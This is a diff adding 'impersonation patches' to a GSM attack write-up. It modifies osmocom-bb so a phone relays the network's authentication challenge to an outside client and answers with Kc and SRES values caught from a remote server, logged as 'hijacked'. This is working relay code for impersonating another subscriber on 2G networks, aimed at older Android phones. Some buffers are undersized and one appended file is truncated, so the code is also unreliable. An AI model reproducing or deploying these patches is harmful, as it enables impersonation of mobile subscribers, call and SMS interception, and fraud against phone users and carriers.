@@ -545,4 +545,113 @@ What happen next ?
 
 Targets android < 12, telco 2G until 2025 in France
 
-Thank for reading
+Thank for reading (see after for impersonation patches)
+
+Seulement dans osmocom-bb/: .git
+Seulement dans heartbreaker/bb-2rfa/src/host/gsmmap: compile
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23: compile
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: client.h
+diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c
+--- osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:39:46.222274989 +0200
++++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c	2022-08-30 15:35:55.472598046 +0200
+@@ -20,6 +20,7 @@
+  */
+ 
+ #include <stdint.h>
++#include <string.h>
+ #include <errno.h>
+ #include <stdio.h>
+ #include <string.h>
+@@ -41,7 +42,7 @@
+ #include <osmocom/bb/mobile/app_mobile.h>
+ #include <osmocom/bb/mobile/vty.h>
+ #include <osmocom/bb/mobile/dos.h>
+-
++#include "client.h"
+ extern void *l23_ctx;
+ 
+ void mm_conn_free(struct gsm48_mm_conn *conn);
+@@ -1662,6 +1663,15 @@
+ 	 */
+ 	if (mm->est_cause == RR_EST_CAUSE_EMERGENCY && set->emergency_imsi[0])
+ 		no_sim = 1;
++	char test2[]="1";
++	sprintf(test2, "%d", ar->key_seq);
++	char test3[3]="-";//"87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";
++	strcat(test3,test2);
++	char test[51]="87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";
++	strcpy(test,osmo_hexdump(ar->rand,16));
++	strcat(test,test3);
++	LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (seq %s)\n", test);
++	client(test);
+ 	gsm_subscr_generate_kc(ms, ar->key_seq, ar->rand, no_sim);
+ 
+ 	/* wait for auth response event from SIM */
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: hex2.h
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: hex.h
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: server2.h
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: server.h
+diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c
+--- osmocom-bb/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:38:53.125893570 +0200
++++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c	2022-08-30 15:35:55.476598075 +0200
+@@ -30,6 +30,11 @@
+ #include <osmocom/bb/common/osmocom_data.h>
+ #include <osmocom/bb/common/networks.h>
+ #include <osmocom/bb/mobile/vty.h>
++#include "server.h"
++#include "server2.h"
++#include "hex.h"
++#include "hex2.h"
++
+ 
+ /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.
+  * if list is changed, the result is not written back to SIM */
+@@ -945,14 +950,21 @@
+ 
+ 		/* store sequence */
+ 		subscr->key_seq = key_seq;
+-		memcpy(subscr->key, vec->kc, 8);
++
+ 
+ 		LOGP(DMM, LOGL_INFO, "Sending authentication response\n");
++                char *h4ck3d_kc;
++                h4ck3d_kc = catch_kc();
++                const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);
++		char *h4ck3d_sres;
++		h4ck3d_sres = catch_sres();
++        	const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);
++		memcpy(subscr->key, my_h4ck3d_kc, 8);
+ 		nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);
+-		if (!nmsg)
+-			return -ENOMEM;
+ 		nmme = (struct gsm48_mm_event *) nmsg->data;
+-		memcpy(nmme->sres, vec->sres, 4);
++        	memcpy(nmme->sres,my_h4ck3d_sres, 4);
++		LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));
++		LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));
+ 		gsm48_mmevent_msg(ms, nmsg);
+ 
+ 		return 0;
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: suppress_space2.h
+Seulement dans heartbreaker/bb-2rfa/src/host/layer23/src/mobile: suppress_space.h
+Seulement dans heartbreaker/bb-2rfa/src/host/osmocon: compile
+Seulement dans osmocom-bb/src/shared/libosmocore/include/osmocom/core: crcgen.h
+```
+suppress_space.h
+```c
+nclude <stdio.h>
+char res[100];
+char* spaces(char str [])
+{
+int i = 0;int j = 0;
+       while (str[i] != '\0')
+       {
+          if ((str[i] == ' ') != 1) {
+            res[j] = str[i];
+            j++;
+          }
+          i++;
+       }
+       res[j] = '\0';
+return res;}
+```
